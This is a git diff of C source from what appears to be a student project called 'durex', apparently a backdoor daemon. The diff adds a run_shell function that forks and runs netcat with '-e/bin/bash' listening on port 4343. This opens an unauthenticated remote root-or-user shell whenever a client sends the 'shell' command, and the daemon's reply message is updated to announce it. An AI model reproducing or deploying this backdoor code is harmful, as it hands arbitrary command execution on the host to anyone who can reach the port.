@@ -6,26 +6,24 @@
 /*   By: hivian <hivian@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2017/06/05 10:27:26 by hivian            #+#    #+#             */
-/*   Updated: 2017/06/13 14:40:18 by hivian           ###   ########.fr       */
+/*   Updated: 2017/07/17 17:09:05 by hivian           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "durex.h"
 
-pthread_attr_t		thread_init()
+static void			run_shell(int sock)
 {
-	pthread_attr_t	thread_attr;
+	pid_t pid = fork();
 
-	if (pthread_attr_init(&thread_attr) != 0) {
-		fprintf (stderr, "pthread_attr_init error");
-		exit(EXIT_SUCCESS);
-    }
-
-	if (pthread_attr_setdetachstate(&thread_attr, PTHREAD_CREATE_DETACHED) != 0) {
-		fprintf (stderr, "pthread_attr_setdetachstate error");
-		exit(EXIT_SUCCESS);
-    }
-	return (thread_attr);
+	if (pid == 0)
+	{
+		pthread_mutex_lock(&lock);
+		close(sock);
+		pthread_mutex_unlock(&lock);
+		char *args[] = {"nc", "-l", "-p4343", "-e/bin/bash", (char *) 0};
+		execv("/bin/nc", args);
+	}
 }
 
 static void			loop(t_thread_params *c, char *buffer, int *ret, int sock,
@@ -65,14 +63,12 @@ char *ip, int port)
 			}
 		} else {
 			if (!strcmp(trim, "shell")) {
-				pthread_mutex_lock(&lock);
-				c->shell_on = true;
-				pthread_mutex_unlock(&lock);
-				message = "[Daemon] Spawning shell on port 4242.\n";
+				message = "[Daemon] Spawning shell on port 4343.\n";
 				send(sock, message, strlen(message), 0);
 				strdel(&trim);
 				*ret = 0;
 				print_logs(c->logs, "Shell active.");
+				run_shell(sock);
 				break;
 			} else {
 				message = "[Daemon] Invalid command. Try again.\n";
